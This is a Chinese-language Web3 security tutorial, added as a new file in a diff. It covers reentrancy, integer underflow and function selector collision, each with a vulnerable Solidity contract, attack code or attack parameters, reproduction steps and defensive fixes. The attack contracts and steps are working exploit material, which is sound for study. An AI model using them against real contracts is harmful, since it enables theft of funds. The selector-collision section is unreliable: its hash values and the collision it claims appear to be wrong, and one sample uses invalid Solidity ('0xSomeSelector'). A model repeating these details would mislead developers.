@@ -1,0 +1,465 @@
+## 1. 概述
+
+本文档旨在深入探讨 Web3 生态中三种常见且极具破坏性的智能合约漏洞：**重入攻击 (Re-entrancy Attack)**、**整数溢出 (Integer Overflow/Underflow)** 和 **函数选择器碰撞 (Function Selector Collision)**。对于每一类漏洞，我们将遵循从技术原理、环境准备、实战复现到安全总结的结构化学习路径。本文结合了理论分析与可操作的攻击流程，旨在为 Web3 安全研究人员和智能合约开发者提供一份详实的技术参考。
+
+---
+
+## 2. 重入攻击 (Re-entrancy Attack)
+
+重入攻击是智能合约安全史上最臭名昭著的漏洞之一，经典的 "The DAO" 事件就是因此而起。当一个合约在完成关键状态变更（如更新余额）之前，调用了另一个不受信任的外部合约时，该外部合约便可能“重入”到原合约的函数中，在状态更新前重复执行提款等敏感操作。
+
+### 2.1 技术原理
+
+以太坊的 `call`、`send` 和 `transfer` 函数在发送以太币时，会执行接收方合约的代码。如果接收方是一个恶意合约，其 `fallback()` 或 `receive()` 函数可以被设计为回调（重入）发起方合约的函数。
+
+攻击的核心逻辑在于利用了 **“先发送，后更新”** 的代码执行顺序。
+
+1.  **受害者合约 (Bank)**：提供存款 (`deposit`) 和取款 (`withdraw`) 功能。`withdraw` 函数的逻辑是：检查余额 -> 发送以太币 -> 更新余额。
+2.  **攻击者合约 (Attack)**：包含一个 `fallback()` 函数。当它接收到以太币时，会再次调用 Bank 合约的 `withdraw` 函数。
+3.  **攻击流程**：
+    *   攻击者向 Bank 合约存入一定数量的 ETH。
+    *   攻击者调用自己的 `attack()` 函数，该函数触发 Bank 合约的 `withdraw` 函数。
+    *   Bank 合约检查攻击者的余额，确认足够，然后通过 `call` 向攻击者合约发送 ETH。
+    *   `call` 触发了攻击者合约的 `fallback()` 函数。
+    *   在 `fallback()` 函数中，攻击者合约**再次**调用 Bank 合约的 `withdraw` 函数。
+    *   由于此时 Bank 合约的余额**尚未更新**，第二次 `withdraw` 检查依然通过，Bank 再次向攻击者发送 ETH。
+    *   这个过程循环往复，直到 Bank 合约的 ETH 被耗尽，或者 `call` 的 Gas 不足以再次调用。
+    *   最后，当所有重入调用返回后，Bank 合约才开始逐层更新余额，但为时已晚。
+
+### 2.2 环境准备
+
+*   **开发框架**: Hardhat 或 Foundry。
+*   **Solidity 版本**: `^0.8.0` (用于演示，实际漏洞在旧版本更常见)。
+*   **钱包**: MetaMask 或类似的 Web3 钱包。
+
+### 2.3 实战示例
+
+#### 2.3.1 漏洞合约：`Bank.sol`
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "hardhat/console.sol";
+
+// 一个存在重入漏洞的银行合约
+contract Bank {
+    mapping(address => uint) public balances;
+
+    // 存款
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    // 提款（存在漏洞）
+    function withdraw() public {
+        uint balance = balances[msg.sender];
+        require(balance > 0, "Insufficient balance");
+
+        // 漏洞点：先发送 ETH，后更新状态
+        (bool success, ) = msg.sender.call{value: balance}("");
+        require(success, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+
+    // 查看合约余额
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+#### 2.3.2 攻击合约：`Attack.sol`
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "./Bank.sol";
+import "hardhat/console.sol";
+
+contract Attack {
+    Bank public bank;
+
+    constructor(address _bankAddress) {
+        bank = Bank(_bankAddress);
+    }
+
+    // 攻击入口函数
+    function attack() public payable {
+        // 1. 先向银行存入 1 ETH
+        bank.deposit{value: msg.value}();
+        // 2. 发起提款，触发重入
+        bank.withdraw();
+    }
+
+    // fallback 函数是重入攻击的核心
+    // 当 Bank 合约向本合约发送 ETH 时，此函数被触发
+    receive() external payable {
+        console.log("Attacker fallback triggered. Contract balance:", address(this).balance);
+        // 只要 Bank 合约还有足够的 ETH，就继续提款
+        if (address(bank).balance >= 1 ether) {
+            bank.withdraw();
+        }
+    }
+
+    // 查看攻击合约的余额
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+
+#### 2.3.3 攻击流程复现
+
+1.  **部署 `Bank` 合约**：部署后，普通用户（或攻击者初始身份）调用 `deposit()` 函数，向 Bank 合约存入 10 ETH。
+2.  **部署 `Attack` 合约**：在部署时，将 `Bank` 合约的地址作为构造函数参数传入。
+3.  **发动攻击**：切换到攻击者钱包，调用 `Attack` 合约的 `attack()` 函数，并附带 1 ETH。
+4.  **验证结果**：
+    *   调用 `Bank` 合约的 `getBalance()` 函数，会发现其余额几乎为零。
+    *   调用 `Attack` 合约的 `getBalance()` 函数，会发现其余额变为 11 ETH（初始存入的 1 ETH + 从 Bank 盗取的 10 ETH），攻击成功。
+
+### 2.4 关键细节与安全总结
+
+**防御措施**：
+
+1.  **检查-生效-交互模式 (Checks-Effects-Interactions Pattern)**：这是最推荐的防御方法。始终在与外部合约交互（如发送 ETH）**之前**完成所有内部状态的变更。
+
+    *   **修复后的 `withdraw` 函数**：
+        ```solidity
+        function withdraw() public {
+            uint balance = balances[msg.sender];
+            require(balance > 0, "Insufficient balance");
+
+            // 生效 (Effect): 先更新内部状态
+            balances[msg.sender] = 0;
+
+            // 交互 (Interaction): 再与外部交互
+            (bool success, ) = msg.sender.call{value: balance}("");
+            require(success, "Failed to send Ether");
+        }
+        ```
+
+2.  **使用重入锁 (Re-entrancy Guard)**：通过一个布尔状态变量（如 `locked`）来防止函数在执行期间被再次调用。OpenZeppelin 提供了标准的 `ReentrancyGuard` 合约。
+
+    *   **使用重入锁的示例**：
+        ```solidity
+        import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+        contract Bank is ReentrancyGuard {
+            // ...
+            function withdraw() public nonReentrant { // 使用 nonReentrant 修饰器
+                // ... 原始逻辑 ...
+            }
+        }
+        ```
+
+---
+
+## 3. 整数溢出 (Integer Overflow/Underflow)
+
+整数溢出/下溢是指当一个算术运算的结果超出了其数据类型所能表示的范围时发生的情况。例如，一个 `uint8` 类型的变量最大值为 255，如果对 `255` 再加 `1`，它会“回绕”到 `0`（上溢）；如果对 `0` 减 `1`，它会“回绕”到 `255`（下溢）。
+
+### 3.1 技术原理
+
+在 Solidity 0.8.0 之前的版本中，整数运算不会默认检查溢出，这为攻击者创造了机会。攻击者可以通过精心构造的输入，使合约中的关键数值（如代币余额、授权额度）发生溢出，从而绕过安全检查或获利。
+
+**常见溢出场景**：
+
+*   **代币转账**：在 `transfer` 或 `transferFrom` 函数中，通过巨额转账数量导致用户余额计算错误。
+*   **计数器**：循环或计数逻辑中，索引变量溢出可能导致无限循环或逻辑错误。
+*   **时间计算**：基于时间戳的计算，如奖励分发，可能因溢出而产生不正确的结果。
+*   **投票统计**：投票数累加时发生溢出，导致统计结果失真。
+
+### 3.2 环境准备
+
+*   **Solidity 版本**:
+    *   漏洞演示：`0.7.6` 或更低版本。
+    *   安全版本演示：`^0.8.0`。
+
+### 3.3 实战示例
+
+#### 3.3.1 漏洞合约 (Solidity < 0.8.0)
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.6;
+
+// 一个存在整数下溢漏洞的简单代币合约
+contract VulnerableToken {
+    mapping(address => uint256) public balanceOf;
+
+    constructor(uint256 _initialSupply) {
+        balanceOf[msg.sender] = _initialSupply;
+    }
+
+    function transfer(address _to, uint256 _value) public {
+        // 漏洞点：没有检查 _value 是否大于 balanceOf[msg.sender]
+        // 如果攻击者余额为 0，但 _value > 0，这里会发生下溢
+        balanceOf[msg.sender] -= _value;
+        balanceOf[_to] += _value;
+    }
+}
+```
+
+#### 3.3.2 攻击流程
+
+1.  **部署合约**：部署 `VulnerableToken` 合约。
+2.  **准备攻击**：攻击者账户的初始余额为 `0`。
+3.  **发动攻击**：攻击者调用 `transfer` 函数，向任意地址（可以是自己）转账任意一个大于 0 的数量（例如 `1`）。
+4.  **触发下溢**：
+    *   `balanceOf[msg.sender] -= _value;` 这一行代码会执行 `0 - 1`。
+    *   由于整数下溢，攻击者的余额 `balanceOf[msg.sender]` 会从 `0` 变为 `uint256` 的最大值 (`2^256 - 1`)。
+    *   攻击者凭空获得了海量的代币。
+
+### 3.4 关键细节与安全总结
+
+**防御措施**：
+
+1.  **使用 Solidity 0.8.0+**：这是最简单有效的防御方法。从 0.8.0 版本开始，Solidity 编译器会为所有的算术运算自动插入溢出检查代码。如果发生溢出，交易将被 `revert`。
+
+2.  **使用 `unchecked` 关键字**：在 Solidity 0.8.0+ 中，如果你确定某段代码不会发生溢出，并且希望节省 Gas，可以使用 `unchecked` 块来禁用溢出检查。
+
+    ```solidity
+    // Solidity >= 0.8.0
+    unchecked {
+        // 这里的代码将不会进行溢出检查，行为类似旧版本
+        counter++;
+    }
+    ```
+
+3.  **使用 SafeMath 库 (针对 Solidity < 0.8.0)**：对于旧版本的 Solidity 项目，必须使用 OpenZeppelin 提供的 `SafeMath` 库。该库为 `add`, `sub`, `mul`, `div` 等运算提供了安全的替代函数。
+
+    ```solidity
+    // Solidity < 0.8.0
+    import "@openzeppelin/contracts/utils/math/SafeMath.sol";
+
+    contract SafeToken {
+        using SafeMath for uint256;
+
+        mapping(address => uint256) public balanceOf;
+
+        function transfer(address _to, uint256 _value) public {
+            require(_value <= balanceOf[msg.sender], "Insufficient balance");
+            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value); // 使用安全的减法
+            balanceOf[_to] = balanceOf[_to].add(_value); // 使用安全的加法
+        }
+    }
+    ```
+
+---
+
+## 4. 函数选择器碰撞 (Call Selector Collision)
+
+在以太坊中，当调用一个合约函数时，交易的 `calldata` 的前 4 个字节是**函数选择器 (Function Selector)**。它由函数签名（函数名和参数类型，无空格）的 Keccak-256 哈希值的前 4 字节截取而成。由于只取前 4 字节，存在哈希碰撞的可能性——即两个不同的函数签名可能拥有相同的选择器。
+
+### 4.1 技术原理
+
+攻击者可以利用选择器碰撞来欺骗合约，使其调用一个意料之外的函数。这种攻击通常发生在合约通过 `call` 方法调用另一个合约，并且函数选择器部分或全部可由用户控制的场景。
+
+**核心问题**：合约 A 打算调用函数 `funcA(uint256)`，但用户提供了一个恶意构造的输入，其哈希也生成了与 `funcA` 相同的选择器，但实际上对应的是另一个危险函数 `funcB()`。
+
+在您提供的案例中，攻击者利用了一个更微妙的变体：一个函数 `executeCrossChainTx` 接收一个 `bytes` 类型的参数，并将其作为函数名的一部分来动态构建并调用。
+
+*   **目标函数签名**: `putCurEpochConPubKeyBytes(bytes)`
+*   **其 Keccak-256 哈希**: `0xc13896c55be3c8784cf734a81f6b217c2a16c73f4a4a49d031601b333e5104b6`
+*   **其选择器**: `0xc13896c5`
+
+攻击者发现，另一个字符串 `f1121318093` 的 Keccak-256 哈希也以 `0xc13896c5` 开头。
+
+*   **碰撞字符串**: `"f1121318093"`
+*   **其 Keccak-256 哈希**: `0xc13896c5f3755bb3292736363b83219a93a8c24b536a4ad4f34cf348f24a7322`
+*   **其选择器**: `0xc13896c5`
+
+如果合约逻辑是这样的：`abi.encodePacked(bytes4(keccak256(userInput)), ...)`，那么攻击者传入 `"f1121318093"` 就能成功调用 `putCurEpochConPubKeyBytes` 函数。
+
+### 4.2 环境准备
+
+*   **Solidity 版本**: `^0.8.0`
+*   **工具**: Remix IDE 或 Hardhat，用于快速部署和调用。
+
+### 4.3 实战示例
+
+#### 4.3.1 漏洞合约：`SelectorClash.sol`
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.10;
+
+import "hardhat/console.sol";
+
+contract SelectorClash {
+    bool public solved = false;
+
+    // 这是一个特权函数，我们不希望它被外部轻易调用
+    function putCurEpochConPubKeyBytes(bytes memory _bytes) public {
+        // 为了演示，我们简化逻辑，直接修改状态
+        solved = true;
+    }
+
+    // 这是一个跨链执行函数，它动态构建调用
+    // 假设 _functionNameBytes 是从外部链传递过来的，用户可控
+    function executeCrossChainTx(
+        bytes memory _functionNameBytes,
+        bytes memory _bytes1,
+        bytes memory _bytes2,
+        uint64 _num
+    ) public returns (bool success) {
+        // 漏洞点：函数选择器是基于用户输入动态生成的
+        // 合约设计者可能认为只有特定的函数名才会被传入
+        bytes4 selector = bytes4(keccak256(_functionNameBytes));
+
+        // 模拟一个复杂的调用，实际上我们只关心 selector
+        // 假设目标函数签名是 (bytes, bytes, uint64)
+        (success, ) = address(this).call(
+            abi.encodePacked(selector, abi.encode(_bytes1, _bytes2, _num))
+        );
+    }
+
+    // 辅助函数，用于计算选择器
+    function getSelector(string memory _func) public pure returns (bytes4) {
+        return bytes4(keccak256(bytes(_func)));
+    }
+}
+```
+
+#### 4.3.2 攻击流程
+
+1.  **部署 `SelectorClash` 合约**。
+2.  **确认初始状态**：检查 `solved` 变量，其值为 `false`。
+3.  **构造攻击参数**：
+    *   我们知道 `putCurEpochConPubKeyBytes(bytes)` 的选择器是 `0xc13896c5`。
+    *   我们找到了一个碰撞的字符串 `"f1121318093"`，其哈希前4字节也是 `0xc13896c5`。
+    *   因此，`_functionNameBytes` 参数应为 `"f1121318093"` 的字节表示：`0x6631313231333138303933`。
+    *   其他参数 `_bytes1`, `_bytes2`, `_num` 可以根据目标函数的参数类型填充，如果目标函数不需要，可以为空值或 `0`。在本例中，`putCurEpochConPubKeyBytes` 需要一个 `bytes` 参数，但由于 `call` 的灵活性和 `abi.encode` 的填充，即使我们传入为其他函数准备的参数，调用也可能成功（尽管参数可能解析不正确，但这足以触发函数执行）。为了简化，我们传入空值。
+4.  **发动攻击**：调用 `executeCrossChainTx` 函数，参数如下：
+    *   `_functionNameBytes`: `0x6631313231333138303933`
+    *   `_bytes1`: `0x`
+    *   `_bytes2`: `0x`
+    *   `_num`: `0`
+5.  **验证结果**：再次查看 `solved` 变量的值，它已经被修改为 `true`，攻击成功。合约本意是执行一个由 `_functionNameBytes` 指定的函数，但我们通过碰撞，调用了完全不同的 `putCurEpochConPubKeyBytes` 函数。
+
+
+### 4.4 关键细节与安全总结
+
+**防御措施**：
+
+1.  **避免动态生成选择器**：最根本的防御方法是不要让函数选择器完全或部分地由不受信任的外部输入控制。应使用白名单或硬编码的方式来确定要调用的函数。
+
+    *   **白名单示例**：
+        ```solidity
+        mapping(bytes4 => bool) public whitelistedSelectors;
+
+        constructor() {
+            whitelistedSelectors[bytes4(keccak256("safeFunction(uint256)"))] = true;
+            whitelistedSelectors[bytes4(keccak256("anotherSafeFunction(address)"))] = true;
+        }
+
+        function executeGeneric(bytes calldata _calldata) public {
+            bytes4 selector = bytes4(_calldata[:4]);
+            require(whitelistedSelectors[selector], "Function not whitelisted");
+            // ... 执行调用
+        }
+        ```
+
+2.  **使用完整的函数签名**：如果必须动态调用，不要只依赖函数名。应该对完整的函数签名 `functionName(type1,type2)` 进行哈希，并进行严格匹配。这虽然不能防止攻击者找到另一个具有相同完整签名的函数（这几乎不可能），但可以防止他们用一个简单的字符串（如 `"f1121318093"`）来碰撞一个复杂签名的函数。
+
+3.  **访问控制**：对所有可能被意外调用的敏感函数（如 `putCurEpochConPubKeyBytes`）实施严格的访问控制（例如 `onlyOwner`）。这是纵深防御的关键一环。即使发生选择器碰撞，如果 `msg.sender` 不具备权限，调用也会因为权限检查失败而被 `revert`。
+
+    *   **修复后的 `SelectorClash` 合约**：
+        ```solidity
+        import "@openzeppelin/contracts/access/Ownable.sol";
+
+        contract SelectorClash is Ownable {
+            bool public solved = false;
+
+            // 增加 onlyOwner 修饰器
+            function putCurEpochConPubKeyBytes(bytes memory _bytes) public onlyOwner {
+                solved = true;
+            }
+
+            // ... 其他函数 ...
+        }
+        ```
+    在这种情况下，即使攻击者成功构造了碰撞并调用了 `putCurEpochConPubKeyBytes`，由于调用者 (`msg.sender`) 是 `SelectorClash` 合约自身（通过 `address(this).call`），而不是合约的 `owner`，交易会失败。
+
+4.  **参数类型与长度检查**：在执行低级调用（如 `address.call()`）之前，对传入的参数进行严格的类型和长度检查。这不仅是良好的编程习惯，也能有效增加攻击者构造恶意 `calldata` 的难度。即使攻击者找到了一个选择器碰撞，如果附带的参数（payload）与目标函数的预期不匹配，调用也可能因为无法正确解码参数而失败。
+
+    *   **示例**：
+        ```solidity
+        function executeCrossChainTx(
+            bytes memory _functionNameBytes,
+            bytes memory _bytes1,
+            bytes memory _bytes2,
+            uint64 _num
+        ) public returns (bool success) {
+            bytes4 selector = bytes4(keccak256(_functionNameBytes));
+
+            // 在调用前增加检查
+            // 示例：如果我们期望 _bytes1 不应为空
+            require(_bytes1.length > 0, "Parameter _bytes1 cannot be empty");
+
+            // 示例：如果我们知道某个函数需要一个 32 字节的参数
+            if (selector == 0xSomeSelector) { // 0xSomeSelector 是某个已知函数的选择器
+                require(_bytes1.length == 32, "Invalid length for _bytes1");
+            }
+
+            (success, ) = address(this).call(
+                abi.encodePacked(selector, abi.encode(_bytes1, _bytes2, _num))
+            );
+        }
+        ```
+    这种方式虽然不能完全根除选择器碰撞的风险，但它构建了纵深防御，迫使攻击者需要同时满足选择器和参数结构两个条件，大大提高了攻击门槛。
+
+5.  **使用更安全的调用方式**：如果可能，避免使用底层的 `address.call()`。当与合约内的其他函数交互时，直接通过函数名调用 (`internalFunction()`) 是最安全的方式，因为它不涉及 `calldata` 和函数选择器。当与外部合约交互时，通过其接口 (`IContract(address).functionName()`) 进行调用也比手动构造 `call` 更安全，因为编译器会为你处理选择器和参数编码。
+
+---
+
+## 5. 综合安全总结与最佳实践
+
+在智能合约开发中，安全永远是第一位的。重入、整数溢出和选择器碰撞仅仅是众多潜在漏洞中的三种，但它们代表了不同层面的安全风险：执行流程、数据计算和外部交互。
+
+### 5.1 核心安全原则
+
+1.  **最小权限原则 (Principle of Least Privilege)**：
+    *   函数默认应为 `internal` 或 `private`，只有确实需要外部调用的才设为 `public` 或 `external`。
+    *   使用 `Ownable`、`AccessControl` 等模式严格限制对敏感函数的访问。谁可以调用？在什么条件下可以调用？这些问题必须有明确的答案。
+
+2.  **默认拒绝 (Fail-Safe / Deny by Default)**：
+    *   在函数的开头使用 `require` 语句检查所有前提条件（如输入值、调用者身份、合约状态）。宁可让合法的调用失败，也绝不让非法的调用成功。
+
+3.  **拥抱成熟方案 (Embrace Battle-Tested Solutions)**：
+    *   **始终使用最新稳定版的 Solidity 编译器**（目前 `>0.8.x`），它内置了整数溢出检查。
+    *   **优先使用 OpenZeppelin 等经过审计的标准库**来实现 `ERC20`、`ERC721`、`Ownable`、`ReentrancyGuard` 等常用功能。不要重新发明轮子，尤其是在安全领域。
+
+4.  **清晰的代码逻辑 (Clarity of Code)**：
+    *   遵循 **“检查-生效-交互” (Checks-Effects-Interactions)** 模式是防御重入攻击的黄金法则。
+    *   代码应易于阅读和理解。复杂的逻辑更容易隐藏漏洞。编写详细的 NatSpec 注释来解释每个函数的作用、参数和返回值。
+
+### 5.2 开发与审计清单
+
+在部署任何合约之前，可以对照以下清单进行自查：
+
+| 类别 | 检查项 | 关键防御措施 |
+| :--- | :--- | :--- |
+| **外部调用** | 是否存在向不受信任地址的 `call` 调用？ | 使用“检查-生效-交互”模式；使用 `ReentrancyGuard`。 |
+| | 调用是否可能因为 `fallback` 函数而重入？ | 使用 `nonReentrant` 修饰器。 |
+| **数学运算** | 项目是否使用 `Solidity < 0.8.0`？ | 必须使用 `SafeMath` 库。 |
+| | 项目是否使用 `Solidity >= 0.8.0`？ | 确认没有滥用 `unchecked` 块。 |
+| | 是否存在涉及用户输入的乘法或指数运算？ | 对输入值设置合理的上限。 |
+| **访问控制** | 谁可以铸造代币？谁可以提取资金？谁可以升级合约？ | 使用 `onlyOwner` 或更细粒度的 `AccessControl`。 |
+| | 是否存在可能被意外调用的 `public` 函数？ | 审查所有 `public/external` 函数的必要性。 |
+| **交互逻辑** | 是否存在基于用户输入动态构造调用的逻辑？ | 避免动态生成函数选择器；使用白名单机制。 |
+| | 合约是否依赖外部合约的返回值？ | 始终检查 `call` 的 `success` 布尔值。 |
+
+### 5.3 持续学习
+
+Web3 安全领域在不断演进，新的攻击向量和防御技术层出不穷。保持对以下资源社区的关注至关重要：
+
+*   **ConsenSys Diligence:** [https://consensys.net/diligence/blog/](https://consensys.net/diligence/blog/)
+*   **Trail of Bits Blog:** [https://blog.trailofbits.com/](https://blog.trailofbits.com/)
+*   **Paradigm:** [https://www.paradigm.xyz/](https://www.paradigm.xyz/)
+*   **Ethernaut (by OpenZeppelin):** 一个通过实战学习智能合约安全的 Web3/Solidity 游戏。
+
+通过系统性地学习、实践和遵循行业最佳实践，我们可以构建出更健壮、更安全的去中心化应用，共同维护 Web3 生态的繁荣与稳定。
